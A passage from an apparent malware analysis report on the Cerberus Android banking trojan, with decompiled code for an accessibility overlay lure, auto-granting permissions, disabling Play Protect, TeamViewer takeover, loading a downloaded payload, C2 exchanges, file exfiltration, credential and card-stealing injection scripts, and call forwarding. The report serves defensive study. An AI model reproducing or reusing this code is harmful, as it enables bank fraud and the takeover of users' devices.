+16.          var5.append(this._strings.bd); 
+17.          var5.append(this._strings.be); 
+18.          var5.append(this._strings.bf); 
+19.          var5.append(this._strings.bg); 
+20.          String var2 = _Utils._Base64DecodeWebSafe(var5.toString()); 
+21.          String var3 = Locale.getDefault().getLanguage().toLowerCase(); 
+22.          var6 = decryptedStr("var lang = 'en'"); 
+23.          StringBuilder var4 = new StringBuilder(); 
+24.          var4.append(decryptedStr("var lang = '")); 
+25.          var4.append(var3); 
+26.          var4.append(decryptedStr("'")); 
+27.          var6 = var2.replace(var6, var4.toString()).replace(decryptedStr("Start Accessibility"), 
+
+this._strings._campaignPkgName); 
+28.          if (decryptedStr("xiaomi").equalsIgnoreCase(Build.MANUFACTURER)) { 
+29.             if (_Utils._getMIUIVersion() >= 11) { 
+30.                var3 = decryptedStr("%Enable_Accessibility_Service%"); 
+31.                var4 = new StringBuilder(); 
+32.                var4.append(this._utils._genAcsbltyPermReqNotifBodyOPENMOREDOWNLOADEDSERVICES()); 
+33.                var4.append(this._utils._genAcsbltyPermReqNotifBodyACTIVATE()); 
+34.                var6 = var6.replace(var3, var4.toString()); 
+35.                break label17; 
+36.             } 
+37.             _Utils._getMIUIVersion(); 
+38.          } 
+39.          var6 = var6.replace(decryptedStr("%Enable_Accessibility_Service%"), 
+
+this._utils._genAcsbltyPermReqNotifBodyACTIVATE()); 
+40.       } 
+41.       this.c.loadDataWithBaseURL((String)null, var6, decryptedStr("text/html"), "UTF-8", (String)null); 
+42.       this.setContentView(this.c); 
+43.    } 
+
+Figure 5.3.1 Accesibility Overlay 
+
+ 
+
+In the above code, onCreate function creates some webkit objects like WebChromeClient, WebView, WebViewClients, etc. and 
+fetches Base64 encoded strings from an encrypted Java class in line between 15-19 and appends these strings to construct HTML 
+code to be rendered. Also, the malware controls if the device is Xiaomi or not.  If the device is Xiaomi, then the malware adds some 
+specific strings to the screen like “Open More downloaded services >”. After this process, appending strings were decrypted and 
+the page in Figure 5.3.2 has been created. 
+
+  
+
+Public  I  12 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ 
+Figure 5.3.2 Enable Accessibility Page 
+
+ 
+
+Also, the strings “%Enable_Accessibility_Service%” and “Start Accessibility” in the screen had been changed in real-time with 
+prefix string (Enable) + package name like e-Devlet, eDestek, EvdeHayatVar20GB, etc. 
+
+Within the above accessibility HTML page, we detected a javascript code presence.  Within this code block, 34 other languages are 
+provided for stability / reliability of injections. The provided languages are as shown in Figure 5.3.3. 
+ 
+
+Afrikaans Czech Greek Japanese Portuguese Swedish 
+Arabic Danish Hebrew Korean Romanian Thai 
+Bulgarian Dutch Hindi Latvian, Lettish Serbian Turkish 
+Catalan English Hungarian Lithuanian Slovak Vietnamese 
+Chinese Finnish Indonesian Norwegian Slovenian  
+Croatian German Italian Polish Spanish  
+
+Figure 5.3.3 Provided Languages  
+
+ 
+
+So in this page, if the user click the Start Accessibility or the button provided in the bottom of the page, malware starts the 
+android.settings.ACCESSIBILITY_SETTINGS intent using the onclick methods in the Figure 5.3.4 and Figure 5.3.5. 
+
+1. <div class="an"> 
+2.    <div class="els" onclick="Android.openAccessibilityService();"> 
+3.       <div class="nm"> 
+4.          <b id="startaccessability">Start Accessibility</b> 
+5.       </div> 
+6.       <div id="off2" class="vl">OFF</div> 
+7.     </div> 
+8. </div> 
+
+Figure 5.3.4 HTML Part - 1 
+
+1. <div class="btn_div">  
+2.    <button onclick="Android.openAccessibilityService();" class="btn   btn-outline-success"> >>  
+3.    </button> 
+4. </div> 
+
+Figure 5.3.5 HTML Part – 2 
+
+ 
+  
+
+Public  I  13 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+openAccessibilityService() method in the onclick event as you can see in the Figure 5.3.6 creates a new intent. 
+
+1. public class WebAppInterface { 
+2.     Context mContext; 
+3.   
+4.     WebAppInterface(Context var2) { 
+5.        this.mContext = var2; 
+6.     } 
+7.  
+8.     @JavascriptInterface 
+9.     public void openAccessibilityService() { 
+10.        accessibilityPermReqUIhtml.this.startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS")); 
+11.     } 
+12. } 
+
+Figure 5.3.6 Java Code 
+
+ 
+
+When the new settings intent starts, application that installed by the user, wants to get some permissions. 
+ 
+
+ 
+Figure 5.3.7 Accessibility Popup 
+
+ 
+If user provide required permissions for malware, it starts abusing accessibility setting on the device. 
+
+ 
+
+ Abusing Accessibility 
+
+In this section, we will mention how malware abuses accessibility mechanism of the infected device. 
+
+Device users all activity is tracked by the malware. For example, if user launches settings window malware is also aware of this. 
+ 
+
+packageApp{com.android.settings} strText{security & location} 
+className{com.android.settings.settings$securitysettingsactivity} 
+packageApp{com.android.settings} strText{settings} className{com.android.settings.settings} 
+packageApp{com.android.settings} strText{settings} className{com.android.settings.settings} 
+packageApp{com.android.settings} strText{accessibility} 
+className{com.android.settings.settings$accessibilitysettingsactivity} 
+packageApp{com.android.settings} strText{settings} className{com.android.settings.settings} 
+packageApp{com.android.settings} strText{settings} className{com.android.settings.settings} 
+packageApp{com.android.launcher3} strText{apps list} className{com.android.launcher3.launcher} 
+packageApp{com.android.launcher3} strText{home screen 1 of 1} className{com.android.launcher3.launcher} 
+packageApp{com.android.launcher3} strText{home screen 1 of 1} className{com.android.launcher3.launcher} 
+
+Figure 5.4.1 Logcat Output 
+
+  
+
+Public  I  14 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+If the user tries to remove the infected application or tries to turn off the accessibility of the malicious application, it prevents the 
+user from removing the malware by executing the function in Figure 5.4.2. This function varies depending on the launched activity. 
+For specific activities, malware executes a function to go back 4 times from current activity. 
+
+1. private void _tapGoBack2Times() { 
+2.    if (VERSION.SDK_INT > 15) { 
+3.       for(int var1 = 0; var1 < 2; ++var1) { 
+4.         this.performGlobalAction(1); // It triggers GLOBAL_ACTION_BACK event. 
+5.       } 
+6.    } 
+7. }  
+
+Figure 5.4.2 Java Code 
+
+ 
+
+In settings, first the malware detects if user logged in to Google Play Store. After that it checks if Google Play Protect is turned on 
+or off. If Google Play Protect settings are active like in the Figure 5.4.3, it tries to deactivate them via abusing accessibility settings 
+of the device. 
+
+ 
+Figure 5.4.3 Play Protect settings 
+
+ 
+
+For deactivation process of Google Play Protect, malware stores important data related to this action on var7 in Figure 5.4.4 . 
+
+1. var7 = new String[]{ 
+2. decryptedStr("com.android.vending:id/toolbar_item_play_protect_settings") 
+3. ,decryptedStr("com.android.vending:id/play_protect_settings") 
+4. ,decryptedStr("android:id/button1")}; 
+
+Figure 5.4.4 Java Code 
+ 
+
+1. do { 
+2.    if (!var6.hasNext()) { 
+3.       continue label121; 
+4.    } 
+5.    ((AccessibilityNodeInfo)var6.next()).performAction(16); 
+6.    this.d = decryptedStr("1"); 
+7. }while(!var7[var5].equals(decryptedStr("android:id/button1"))); 
+8. this._tapGoBack2Times(); 
+
+Figure 5.4.5 Java Code 
+
+ 
+
+And then, the malware, using the performAction(16) function -integer 16 refers to ACTION_CLICK- as you can see above, clicks the 
+toggle buttons. After the process, the malware tells the system to go back 2 times. Thus, deactivating had been done. 
+
+In some situations, the device wants to get some permission with user interaction like ALLOW – DENY or YES-NO. The malware 
+controls these permissions like you can see in the Figure 5.4.6. 
+
+1. var98 = new String[]{ 
+2. decryptedStr("com.android.packageinstaller:id/permission_allow_button") 
+3. ,decryptedStr("com.android.permissioncontroller:id/permission_allow_button") 
+4. ,decryptedStr("android:id/button1") 
+5. ,decryptedStr("com.android.settings:id/action_button")}; 
+
+Figure 5.4.6 Java Code 
+
+To click the button, the var98 variable stores the important things to act. 
+
+Public  I  15 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+1. do { 
+2.    ((AccessibilityNodeInfo)var92.next()).performAction(16); 
+3. this._utils._writeSharedPreference(this,this._strings._dozeModeBool, ""); 
+4. this._utils._logcatError(this._thisClassSimpleName, decryptedStr("-=CLICK BUTTON=-")); 
+5. }while(!var98[index].contains(decryptedStr("com.android.settings:id/action_button"))); 
+
+Figure 5.4.7 Java Code 
+ 
+
+And then, using the performAction(16) function as you can see above, it clicks to ALLOW button to get permission. This process 
+takes place quickly and the user can not almost notice. Thus, when the malware gets the extra permission, it continues to give 
+itself more permissions via this method. 
+
+Some abused packages are presented in Figure 5.4.8. 
+
+ 
+com.android.vending 
+com.google.android.gms.security.settings.verifyappssettingsactivity 
+
+com.miui.permcenter.permissions.permissionseditoractivity 
+com.miui.permcenter.autostart.autostartmanagementactivity 
+com.miui.powerkeeper.ui.hiddenappsconfigactivity 
+com.miui.appmanager.applicationsdetailsactivity 
+
+com.miui.cleanmaster 
+com.miui.optimizecenter.deepclean.installedapp.installedappsactivity 
+com.android.packageinstaller 
+
+com.android.permissioncontroller 
+com.miui.securitycenter 
+com.google.android.packageinstaller 
+
+com.android.settings 
+com.teamviewer.host.market 
+com.samsung.klmsagent 
+
+Figure 5.4.8 Abused Packages 
+
+ 
+
+When looking at the table, some parameters/packages (like teamviewer, miui, samsung) drew our attention. 
+
+A different user interface was used in Xiaomi MIUI. For this reason, the malware has a different java class to execute some functions 
+related to Xiaomi. These functions did not do anything different from mentioned above. 
+
+For the TeamViewer package, it is observed that the malware checks the device for existing TeamViewer host / package. 
+
+1. if (VERSION.SDK_INT < 18) { 
+2.    break label519; 
+3. } 
+4. if (!this.h.contains(decryptedStr("com.teamviewer.host.market"))) { 
+5.    break label798; 
+6. } 
+7. var85 = CerberusCF._accessibilityAbuserMIUI 
+8. .a(var1, decryptedStr("com.teamviewer.host.market:id/host_assign_device_username")); 
+9. var99 = CerberusCF._accessibilityAbuserMIUI 
+10. .a(var1, decryptedStr("com.teamviewer.host.market:id/host_assign_device_password")); 
+11. var100 = CerberusCF._accessibilityAbuserMIUI 
+12. .a(var1, decryptedStr("com.teamviewer.host.market:id/host_assign_device_submit_button")); 
+13. }  
+
+Figure 5.4.9 Java Code 
+ 
+
+After the activation of the malicious process, if the malware gets the username and the password, it launches the app like in the 
+Figure 5.4.10 and after this process malware can provide remote management to actors via TeamViewer. 
+
+  
+
+Public  I  16 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+1. try { 
+2.    if (this.p == 1) { 
+3.       this.c.a(var95); 
+4.       this.c.a(var97); 
+5.       this.p = 2; 
+6.       CerberusCF._Utils._launchApp(this, decryptedStr("com.teamviewer.host.market")); 
+7.    } 
+8. }catch (Exception var27) { 
+9.    var10001 = false; 
+10.    break label518; 
+11. } 
+
+Figure 5.4.10 Java Code 
+
+ 
+
+ What We Know About the Command & Control Server 
+
+As the advertisement / announcement from the forum suggests Command and Control servers can run with nginx and Apache. As 
+a part of our information gathering and client-side request analysis we have created a sample network structure for Cerberus 
+operation. 
+
+ 
+Figure 5.5.1 Network Structure 
+
+  
+
+Public  I  17 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ 
+Figure 5.5.2 Wireshark 
+
+ 
+
+When malware is fully loaded, it starts sending requests to C2. At first request malware is still trying to gather some data about 
+the device. Thus, the response from C2 is no_device. After malware acquires all relevant data from the infected device, malware 
+sends a new_device request to C2 and adds device as infected to the admin panel. 
+
+new_device query is shown in Figure 5.5.3. 
+ 
+
+q=new_device&ws={"ID":"7u7b-zjye-rtaj-
+lg8r","AR":"6.0","TT":"clarkst26s","CY":"us","OP":"Android","MD":"Unknown Custom"} 
+
+Figure 5.5.3 Parameter 
+ 
+
+After the malware saves itself to the C2, it continues to send data to C2 about the device. Requests sent by the device can be found 
+in Figure 5.5.4. info_device requests contains device data such as Device Battery Level, Device Language, Phone Number Of the 
+device etc. 
+ 
+
+q=info_device&ws={"DM":"1","AD":"null","BL":"96","TW":"54","SA":"0","SP":"2","SS":"1","LE":"en","SY":"1","SM"
+:"0","ID":"7u7b-zjye-rtaj-lg8r","IS":"4e8nnea8YkSxmrF","NR":"","GA":"","PS":"0","PC":"0","PP":"0","PO":"0"} 
+
+Figure 5.5.4 Parameter 
+
+ 
+
+For more information about parameters shown up please refer to Section 5.8. 
+
+In further requests, the malware had downloaded the ring0.apk to the device after the upgrade_n_patch request. With the 
+upgrade_n_patch request, the malware had sent the device ID that was saved to C2 panel in advance. 
+ 
+
+q=upgrade_n_patch&ws={"ID":"7u7b-zjye-rtaj-lg8r"} 
+Figure 5.5.5 Parameter 
+
+ 
+
+If the ID matches the device, C2 fetches the ring0.apk to the device like in Figure 5.5.6. 
+
+  
+
+Public  I  18 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ 
+Figure 5.5.6 Wireshark 
+
+ 
+
+The details about the ring0.apk had been mentioned in 5.7 section. 
+
+After ring0.apk is downloaded, the malware sends some info_device requests about the phone state again and executes some 
+functions to collect and save data from all applications in the device. So, it sends the is_attacker requests with the following data 
+to the C2. 
+ 
+
+q=is_attacker&ws={"ID":"7u7b-zjye-rtaj-
+lg8r","AP":"com.android.quicksearchbox:com.android.messaging:ycrauzxbexes.fqfttggxafbeuqzc.ukwyblzcclpatxaczj
+tcmfwgt:com.android.browser:de.robv.android.xposed.installer:com.android.providers.downloads.ui:com.android.v
+ending:opensecurity.clipdump:com.android.contacts:com.android.camera2:mobi.acpm.inspeckage:com.android.calend
+ar:com.garanti.cepsubesi:com.xtoolapp.flashlight:com.android.development_settings:com.android.dialer:com.andr
+oid.gallery3d:com.example.android.apis:com.amaze.filemanager:com.android.settings:com.android.calculator2:com
+.android.gesture.builder:com.android.email:eu.chainfire.supersu:com.android.music:com.android.deskclock:com.a
+ndroid.customlocale2:com.android.development:"} 
+
+Figure 5.5.7 Parameter 
+
+ 
+
+As shown above, the malware had sent the package names of all applications and if one of those is a banking application, it had 
+initialized the injection process. A banking application has been installed before starting the analysis to observe the malware 
+behaviour. Here, the banking application is under the censor because of the privacy issues as you know.  During the injection 
+process, the malware had downloaded an application (injection) like the banking application detected before. Downloading starts 
+after the d_attacker request like in Figure 5.5.8 sent. 
+
+ 
+POST / HTTP/1.1 
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 102 
+Host: coko*************** 
+Connection: Keep-Alive 
+Accept-Encoding: gzip 
+User-Agent: okhttp/3.6.0 
+q=d_attacker&ws=MzYyMmEzN2ZlYjIzODYxNzg2YzY5MjU4MDQwNDNiZmRmZmM0NDM0Y2U1MjY2YjhhMzY4Yjg5ZWQy%0AMmUz%0A 
+ 
+HTTP/1.1 200 OK 
+Date: Mon, 03 Aug 2020 21:45:28 GMT 
+Server: Apache/2.4.29 (Ubuntu) 
+Vary: Accept-Encoding 
+Content-Encoding: gzip 
+Access-Control-Allow-Origin: * 
+Content-Length: 23411 
+Connection: close 
+Content-Type: text/html; charset=UTF-8 
+NzEyMWE2N2I4YTRkZmQyNGFjOGJkNDRiMDgxYTY0OWU4MTkxMDU1YmVkM2EzODkzMzU4MDlkYjkyMmZiZTQ2MDUxZDJjZTlhMzEwODU2ZGM5NWJh
+MGRhOWE2OWM1MGNjMjE0MDgxMWFhM 
+… 
+
+Figure 5.5.8 POST Request 
+
+ 
+
+  
+
+Public  I  19 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+As seen on the figure on top HTTP response is a large, encrypted data. This is the injection file of corresponding app request. 
+Injection imitates the login / payment screen of the targeted app. After this response, malware again sends the package name of 
+file for corresponding injection. This time response includes targeted apps icon for literalism of injection. 
+
+q=d_attacker_two&ws={"AK":"com.garanti.cepsubesi"} 
+Figure 5.5.9 Parameter 
+
+ 
+
+Also if the device has a play store service (com.android.vending), the malware had requested some extra d_attacker requests. The 
+result of this requests, the “Add credit or debit card” page following had been downloaded to the device. 
+
+ 
+Figure 5.5.10 Injection 
+
+ 
+
+ Gathering Device Information  
+
+Malware does some checks depending on the SDK version of the device. It looks for information such as Device Default Language, 
+Network Connection Status, Current Time, Device External Data Storage, Device MCC Value for location. 
+
+In the Figure 5.6.1 code blocks, malware checks network status and type. 
+
+1. private static boolean B(Context context) { 
+2.     if ((context = (ConnectivityManager)context.getSystemService("connectivity")) 
+3.        .getNetworkInfo(0) 
+4.        .getState() == NetworkInfo.State.CONNECTED) return true; 
+5.        if (context.getNetworkInfo(1).getState() != NetworkInfo.State.CONNECTED) return false; 
+6.        return true; 
+7. } 
+
+Figure 5.6.1 Java Code 
+ 
+
+1. public static boolean d(Context context) { 
+2.     NetworkInfo networkInfo = (context = 
+
+(ConnectivityManager)context.getSystemService("connectivity")).getNetworkInfo(1); 
+3.        if (networkInfo != null && networkInfo.isConnected()) { 
+4.            return true; 
+5.        } 
+6.        networkInfo = context.getNetworkInfo(0); 
+7.        if (networkInfo != null && networkInfo.isConnected()) { 
+8.            return true; 
+9.        } 
+10.        if ((context = context.getActiveNetworkInfo()) == null) return false; 
+11.        if (!context.isConnected()) return false; 
+12.        return true; 
+13. } 
+
+Figure 5.6.2 Java Code 
+
+Public  I  20 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+As malware advertisement campaigns show; in the command & conquer panel attackers are able to see device country 
+information as flags. This is done with a few checks. First is getting IP geolocation data, after acquiring the geolocation data C2 
+compares this data with the parameter received from malware. Malware acquires device country information via querying 
+device MCC-MNC (Mobile Country Code) values. 
+
+Code block responsible for MCC check: 
+
+1. //Check country ISO 
+2. //Returns the ISO-3166-1 alpha-2 country code equivalent of the MCC 
+3. public static String a(Context context) { 
+4.     if (!(context = (TelephonyManager)context 
+5.        .getSystemService("phone")) 
+6.        .getNetworkCountryIso() 
+7.        .isEmpty()) return context.getNetworkCountryIso(); 
+8.        return "~no~”. 
+9. } 
+
+Figure 5.6.3 Java Code 
+ 
+
+Malware is also configured to work on Xiaomi systems. One of the first things malware does is to check phones Android 
+Configuration.  
+ 
+Code block for checking MIUI.UI version: 
+
+1. public static int a() { 
+2.     try { 
+3.         Process process = Runtime.getRuntime().exec("getprop ro.miui.ui.version.name"); 
+4.         Object object = new InputStreamReader(process.getInputStream()); 
+5.         BufferedReader bufferedReader = new BufferedReader((Reader)object, 1024); 
+6.         object = bufferedReader.readLine(); 
+7.         bufferedReader.close(); 
+8.         return Integer.parseInt(((String)object).replace("V", "")); 
+9.     } 
+10.     catch (Exception exception) { 
+11.            return 0; 
+12.        } 
+13. } 
+
+Figure 5.6.4 Java Code 
+ 
+
+Malware changes behaviour depending on the system language. It looks at system default language and shows notifications 
+according to this data. 
+
+1. //Unicode character custom > \u015f > ş (latin character) 
+2. public final String c() { 
+3.     try { 
+4.         Object object = new JSONObject(this.a.aX); 
+5.         CharSequence charSequence = Locale.getDefault().getLanguage().toLowerCase(); 
+6.         if (((String)charSequence).equals("tr")) { 
+7.             object = new StringBuilder("L\u00fctfen "); 
+8.             ((StringBuilder)object).append(this.a.i); // >> (or any other malware application name ) 
+9.             ((StringBuilder)object).append(" Etkinle\u015ftirin"); 
+10.             return ((StringBuilder)object).toString(); 
+11.         } 
+12.         object = object.getString((String)charSequence); 
+13.         charSequence = new StringBuilder(); 
+14.         ((StringBuilder)charSequence).append((String)object); 
+15.         ((StringBuilder)charSequence).append(" "); 
+16.         ((StringBuilder)charSequence).append(this.a.i); 
+17.         return ((StringBuilder)charSequence).toString(); 
+18.        } 
+19.     catch (Exception exception) { 
+20.         StringBuilder stringBuilder = new StringBuilder(); 
+21.         stringBuilder.append(this.a.J); 
+22.         stringBuilder.append(" "); 
+23.         stringBuilder.append(this.a.i); 
+24.         return stringBuilder.toString(); 
+25.     } 
+26. } 
+
+Figure 5.6.5 Java Code 
+
+Public  I  21 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ Downloaded Module 
+
+Cerberus malware is capable of downloading new code at runtime. After malware acquires needed permissions it may download 
+a module called ‘ring0.apk’. 
+
+Code block responsible for patching the malware: 
+
+1. public class _loadDownloadedStage_runsmsq extends Activity { 
+2.    protected void onCreate(Bundle var1) { 
+3.       super.onCreate(var1); 
+4.       if (VERSION.SDK_INT >= 29) { 
+5.          _Utils var6 = new _Utils(); 
+6.          try { 
+7.             File var2 = new File(this.getDir("apk", 0), var6._stringsClassf._downloadedStageFileName); 
+8.             if (var2.exists()) { 
+9.                var2 = new File(this.getDir("apk", 0), var6._stringsClassf._downloadedStageFileName); 
+10.                File var3 = this.getDir("outdex", 0); 
+11.                DexClassLoader var8 = new DexClassLoader(var2.getCanonicalPath(), var3.getAbsolutePath(), 
+
+(String)null, var6.getClass().getClassLoader()); 
+12.                Class var7 = var8.loadClass("patch.ring0.run"); 
+13.                var7.getMethod("runsmsq", Activity.class).invoke(var7.newInstance(), this); 
+14.             } 
+15.   
+16.          } catch (Exception var5) { 
+17.             StringBuilder var4 = new StringBuilder("Error: "); 
+18.             var4.append(var5.toString()); 
+19.             var6._logcatError("DexClassLoader", var4.toString()); 
+20.          } 
+21.       } else { 
+22.          this.finish(); 
+23.       } 
+24.    } 
+25. } 
+
+Figure 5.7.1 Java Code 
+ 
+
+Code block for loading new payload: 
+
+1. File var141 = new File(this.getDir("apk", 0), var130._stringsClassf._downloadedStageFileName); 
+2. var140 = this.getDir("outdex", 0); 
+3. DexClassLoader var138 = new DexClassLoader(var141.getCanonicalPath(), var140.getAbsolutePath(),  
+4. (String)null, var130.getClass().getClassLoader()); 
+5. Class var142 = var138.loadClass("patch.ring0.run"); 
+6. var143 = var142.getMethod("main", Context.class, String.class); 
+7. var144 = var142.newInstance(); 
+
+Figure 5.7.2 Java Code 
+
+ 
+
+ Remote Control 
+
+Remote Control from C2 is achieved by sending HTTP / HTTPS requests from bot to C2. Malware is also able to give actors device 
+remote control via TeamViewer application. For more information about malwares’ capability of abusing TeamViewer, please refer 
+to Section 5.4. Malware sends different parameters in requests to collect as much data as possible about the device. We should 
+also state that our analysis about parameters also correlates with Cerberus developers’ claims. 
+ 
+
+AR: Android Version 
+SC: Installed Apps  
+TT: Campaign Name  
+OP: Device OS / Android 
+MD: Device Model  
+DM: Bot has ring0 Check 
+AD: Default SMS OK 
+BL: Device Battery Level 
+LE: Device Language 
+NR: Phone Number of the Device 
+SR: Play Protect Status 
+SP: Package Name 
+SY: Accessibility Settings OK 
+TW: Bot Tick Value 
+
+Public  I  22 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+AK: Protect Tick Value 
+ES: Endless Foreground Service 
+PS: SMS Related 
+PC: SMS Related 
+PP: MMS Related 
+PO: MMS Related 
+RS: Toast Notification Related 
+IS: Device id_settings 
+ID: Unique device bot ID 
+SQ: Any app to delete OK (“1”, “0”) 
+QR: App to delete 
+
+Figure 5.8.1 Parameters Sent as info_device 
+ 
+
+access_notifications  call_forward 
+change_url_connect  change_url_recover  
+get_all_permission  get_data_logs  
+grabbing_google_authenticator2  grabbing_lockpattern 
+grabbing_pass_gmail notification 
+patch_update rat_connect  
+remove_app remove_bot 
+request_permission  run_admin_device  
+run_app run_record_audio 
+send_mailing_sms  sms_mailing_phonebook  
+update_inject url  
+ussd   
+
+Figure 5.8.2 Remote Control Functions 
+ 
+
+As campaigns and developers of Cerberus malware suggest malware is capable of grabbing and sending different files to C2. 
+Malware sends files base64 value instead of raw data. This mechanism can be used to exfiltrate files saved in target devices such 
+as pictures, text files and more. Base64 data is sent to the C2 through HTTP / HTTPS requests. 
+
+Code block responsible for file exfiltration: 
+
+1. if (f.contains(this.decryptedStr("uploadind_file"))) { 
+2.    final JSONObject jsonObject2 = new JSONObject(f); 
+3.    try { 
+4.        final File file = new File(jsonObject2.getString(this.decryptedStr("uploadind_file"))); 
+5.        final String encodeToString = Base64.encodeToString(CerberusCF._Utils.a(file), 0); 
+6.        final JSONObject jsonObject3 = new JSONObject(); 
+7.        jsonObject3.put(this.decryptedStr("cmd"), (Object)this.decryptedStr("saved_file")); 
+8.        jsonObject3.put(this.decryptedStr("ID"), (Object)i); 
+9.        jsonObject3.put(this.decryptedStr("name"), (Object)file.getName()); 
+10.        jsonObject3.put(this.decryptedStr("file_base64"), (Object)encodeToString); 
+11.        final _Utils a4 = this._utils; 
+12.        final StringBuilder sb4 = new StringBuilder(); 
+13.        sb4.append(this._strings._RATCmd); 
+14.        sb4.append(this._utils._encryptWithC2CommunicationKey(jsonObject3.toString())); 
+15.        a4._postRequestQueryC2Log((Context)this, sb4.toString()); 
+16.     }catch (Exception ex3) { 
+17.         this._utils._logcatError(this._thisClassSimpleName, this.decryptedStr("uploading_file error")); 
+18. } 
+
+Figure 5.8.3 Java Code 
+  
+
+Public  I  23 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ Grabber 
+
+As mentioned in Section 5.5, malware gets new injection / overlay templates depending on the parameter “SC”. C2 cross-checks 
+its injection database for corresponding applications. It was explained how to get the injection codes from C2 in Section 5.5. Some 
+important parts of the JavaScript code related to personal data inside the HTML file that was gathered from C2 like following. 
+
+1. var form1 = document.getElementById('form1'), 
+2.     form2 = document.getElementById('form2'), 
+3.     form3 = document.getElementById('form3'), 
+4.     login = document.getElementById('login'), 
+5.     password = document.getElementById('password'), 
+6.     loginKurumsal = document.getElementById('loginKurumsal'), 
+7.     userNameKurumsal = document.getElementById('userNameKurumsal'), 
+8.     passwordKurumsal = document.getElementById('passwordKurumsal'), 
+9.     sendData = document.getElementById('sendData'), 
+10.     sendDataKurumsal = document.getElementById('sendDataKurumsal'), 
+11.     cc = document.getElementById('cc'), 
+12.     exp = document.getElementById('exp'), 
+13.     cvv = document.getElementById('cvv'), 
+14.     sendDataFull = document.getElementById('sendDataFull'); 
+
+Figure 5.9.1 JavaScript Code 
+
+ 
+
+1. var mmYY = exp.value.split('/'); 
+2. var month = parseInt(mmYY[0]); 
+3. var year = parseInt(mmYY[1]); 
+4.  
+5. var expArray = exp.value.split('/'); 
+6. var today, someday; 
+7. var exMonth = expArray[0]; 
+8. var exYear = "20" + expArray[1]; 
+9.  
+10. today = new Date(); 
+11. someday = new Date(); 
+12. someday.setFullYear(exYear, exMonth, 1); 
+
+Figure 5.9.2 JavaScript Code 
+
+ 
+
+1. var data = {}; 
+2. data.login = login.value; 
+3. data.password = password.value; 
+4. data.loginKurumsal = loginKurumsal.value; 
+5. data.userNameKurumsal = userNameKurumsal.value; 
+6. data.passwordKurumsal = passwordKurumsal.value; 
+7. data.cc = cc.value; 
+8. data.exp = exp.value; 
+9. data.cvv = cvv.value; 
+10. data.cardCode = cardCode.value; 
+
+Figure 5.9.3 JavaScript Code 
+
+ 
+
+In the code above, collected data can be summarized like; 
+
+• User (Citizen ID, Customer ID etc.) 
+• Password 
+• Credit Card Number 
+• CVV 
+• Card Expiration Date 
+• Card Password 
+
+ 
+
+In addition to the injection pages, as you can see In figure 6, the malware tries to collect extract data about device users’ credentials. 
+About this issue, some important parts of the JavaScript code related to personal data inside the HTML file that was uploaded from 
+C2 is like the following. 
+
+  
+
+Public  I  24 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+1. var cc = document.getElementById('cc'), 
+2. errorCC = document.getElementById('errorCC'), 
+3. exp = document.getElementById('exp'), 
+4. errorEXP = document.getElementById('errorEXP'), 
+5. errorName = document.getElementById('errorName'), 
+6. errorCountry = document.getElementById('errorCountry'), 
+7. errorStreet = document.getElementById('errorStreet'), 
+8. errorCity = document.getElementById('errorCity'), 
+9. expAndCvcBlock = document.getElementById('expAndCvcBlock'), 
+10. holderInfo = document.getElementById('holderInfo'), 
+11. holderName = document.getElementById('holderName'), 
+12. country = document.getElementById('country'), 
+13. address = document.getElementById('address'), 
+14. aptSuite = document.getElementById('aptSuite'), 
+15. postalCode = document.getElementById('postalCode'), 
+16. city = document.getElementById('city'), 
+
+Figure 5.9.4 JavaScript Code 
+ 
+
+1. var data = {}; 
+2. data.cc = cc.value; 
+3. data.exp = exp.value; 
+4. data.cvc = cvc.value; 
+5. data.holderName = holderName.value; 
+6. data.country = country.value; 
+7. data.address = address.value; 
+8. data.aptSuite = aptSuite.value; 
+9. data.city = city.value; 
+10. data.postalCode = postalCode.value; 
+
+Figure 5.9.5 JavaScript Code 
+ 
+
+In the above code, the malware collects extra data such as; 
+
+ 
+• Country 
+• Address 
+• Apartment/Suite 
+• Postal Code 
+• City 
+
+ 
+
+ Dialer - SMS Interception 
+
+Cerberus launches phone applications to forward calls and run USSD codes, it automatically approves these actions using 
+accessibility settings. Cerberus can monitor incoming SMS messages and is also able to send SMS. There is also a command to send 
+bulk SMS to all numbers in the contacts that was discovered in the analysis process. 
+
+After receiving call_forward command from C2 with target phone number, malware stars phone activity on phone using 
+*21*PHONE_NUMBER# and reports the result back to C2. 
+
+1. String v4_1 = this_Utils; 
+2. String v5_5 = v6_83.getString(decryptedStr("n")); 
+3. String v6_9 = new android.content.Intent(android.intent.action.CALL); 
+4. v6_9.addFlags(268435456); 
+5. String v8_3 = new StringBuilder(*21*); 
+6. v8_3.append(v5_5); 
+7. v8_3.append(#); 
+8. v6_9.setData(android.net.Uri.fromParts(tel, v8_3.toString(), #)); 
+9. p19.startActivity(v6_9); 
+10. String v6_11 = new StringBuilder(ForwardCALL: ); 
+11. v6_11.append(v5_5); 
+12. v6_11.append([143523#]); 
+13. String v6_12 = v6_11.toString(); 
+14. v4_1.a(ForwardCall, v6_12); 
+15. v4_1.f(p19, v4_1.a.X, v6_12); 
+16. return; 
+
+Figure 5.10.1 Java Code 
+  
+
+Public  I  25 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+After malware receives relevant USSD code from C2, malware starts call activity using received USSD code and reports the result 
+back to C2. 
+
+1. String v4_2 = this_Utils; 
+2. String v5_10 = v6_83.getString(decryptedStr("u")); 
+3. String v6_19 = new android.content.Intent(android.intent.action.CALL); 
+4. v6_19.addFlags(268435456); 
+5. StringBuilder v7_17 = new StringBuilder(tel:); 
+6. v7_17.append(android.net.Uri.encode(v5_10)); 
+7. v6_19.setData(android.net.Uri.parse(v7_17.toString())); 
+8. p19.startActivity(v6_19); 
+9. String v6_21 = new StringBuilder(USSD: ); 
+10. v6_21.append(v5_10); 
+11. v6_21.append([143523#]); 
+12. String v5_12 = v6_21.toString(); 
+13. v4_2.a(USSD, v5_12); 
